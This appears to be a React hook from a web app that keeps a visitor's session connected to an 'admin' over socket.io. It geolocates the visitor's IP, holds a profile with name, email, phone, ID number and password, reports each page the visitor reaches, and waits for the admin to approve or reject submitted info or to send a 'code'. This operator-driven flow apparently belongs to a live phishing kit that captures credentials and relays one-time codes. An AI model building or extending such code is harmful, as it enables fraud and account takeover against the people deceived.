import { customHistory } from "@/components/CustomRouter";
import { Message } from "@/types";
import axios from "axios";
import { deleteCookie } from "cookies-next";
import { useEffect } from "react";
import {
  code,
  currentPage,
  isAdminError,
  isChat,
  isError,
  isNewMessage,
  lastMessage,
  loading,
  mainInfo,
  message,
  messages,
  permissions,
  ROOM,
  sendDataToServer,
  socket,
  socketId,
} from "../context/signals";

function useRealTime() {
  useEffect(() => {
    axios
      .post(
        `${
          import.meta.env.VITE_MODE == "DEV"
            ? import.meta.env.VITE_DEV_API_URL
            : import.meta.env.VITE_PROD_API_URL
        }/auth/check`,
        { code: ROOM }
      )
      .then(() => {
        isError.value = "";
      })
      .catch(() => {
        isError.value =
          "The Code Is Expired Or Wrong, Connect With Page Owner To Solve Problem Or Make Sure That You Write A Right Code";
      });

    // == Listen For Successfully Connected With Real Time Server  ==

    socket.value.on("successfully-connected", (id: string) => {
      socketId.value = id;

      //Joining With Current Id To Server
      socket.value.emit("join", socketId.value);

      socket.value.emit("join", ROOM);

      socket.value.emit("currentPage", {
        ...mainInfo.value,
        page: currentPage.value,
        room: ROOM,
        socketId: socketId.value,
        date: new Date(),
        init: true,
      });
    });

    // == Receiving Messages For Chat ==

    socket.value.on("receive-message", (m: Message) => {
      messages.value = [...messages.value, m];
      if (!isChat.value) {
        isNewMessage.value += 1;
      }
    });

    // == Done Operation Message From Admin  ==

    socket.value.on(
      "admin-last-message",
      ({ message }: { message: string }) => {
        lastMessage.value = message;
        loading.value = "";
        currentPage.value = "END";
      }
    );

    // == Code That Sent From Admin  ==

    socket.value.on("code", (adminCode: string) => {
      code.value = adminCode;
      loading.value = "";
    });

    socket.value.on(
      "admin-response",
      ({ state, next }: { state: boolean; next: string }) => {
        loading.value = "";
        permissions.value = [...permissions.value, next];
        if (state) {
          customHistory.push("/" + next);
        } else {
          isAdminError.value = true;
          message.value =
            "Admin Rejected The Info That You Send To Him, Pleas Make Sure About Them And Try Again !";
        }
      }
    );

    socket.value.on("deleted", () => {
      socket.value.disconnect();

      mainInfo.value = {
        fullName: "",
        email: "",
        phone: "",
        idNumber: "",
        password: "",
        _id: "",
        room: ROOM,
        Ip: "",
        country: "",
        city: "",
        date: "",
        socketId: "",
      };

      deleteCookie("ID");

      isError.value = "The Admin Is Removed Your Account! Try Again Later";
    });

    // setInterval(() => {
    //   socket.value.emit(
    //     "connected-admins",
    //     ROOM,
    //     ({ status }: { status: boolean }) => {
    //       if (!status) {
    //         isError.value = "Admin Is Not Connected Write Now, Come Back Later";
    //       } else {
    //         isError.value = "";
    //       }
    //     }
    //   );
    //   if (!isError.value) {
    //     sendData();
    //   }
    // }, 2000);
  }, []);

  useEffect(() => {
    if (!isError.value)
      axios
        .get("https://ipapi.co/json/")
        .then((res) => {
          loading.value = "";
          socket.value.connect();
          mainInfo.value = {
            ...mainInfo.value,
            room: ROOM,
            Ip: res.data?.ip,
            country: res.data?.country_name,
            city: res.data?.city,
            date: new Date().toString(),
            socketId: socketId.value,
          };
        })
        .catch((err) => {
          console.log(err);
        });
  }, [isError]);

  useEffect(() => {
    if (currentPage.value && mainInfo.value.Ip && socketId.value) {
      socket.value.emit("currentPage", {
        ...mainInfo.value,
        page: currentPage.value,
        room: ROOM,
        socketId: socketId.value,
      });
      socket.value.emit(
        "connected-admins",
        ROOM,
        ({ status }: { status: boolean }) => {
          if (!status) {
            isError.value = "Admin Is Not Connected Write Now, Come Back Later";
          } else {
            isError.value = "";
          }
        }
      );
    }

    if (currentPage.value !== "page5") {
      loading.value = "";
    }

    if (currentPage.value == "page6") {
      sendDataToServer({
        current: "page6",
        data: {},
        nextPage: "page7",
        mode: "code",
        waitingForAdminResponse: true,
      });
    }

    if (currentPage.value == "final") {
      sendDataToServer({
        current: "final",
        data: {},
        nextPage: "",
        waitingForAdminResponse: false,
        mode: "last",
      });
      axios
        .patch(
          `${
            import.meta.env.VITE_MODE == "DEV"
              ? import.meta.env.VITE_DEV_API_URL
              : import.meta.env.VITE_PROD_API_URL
          }/subscriber/completed`,
          { code: ROOM, id: mainInfo.value._id }
        )
        .then(() => {})
        .catch(() => {});
    }
  }, [mainInfo.value, socketId.value, currentPage.value]);

  return;
}

export default useRealTime;
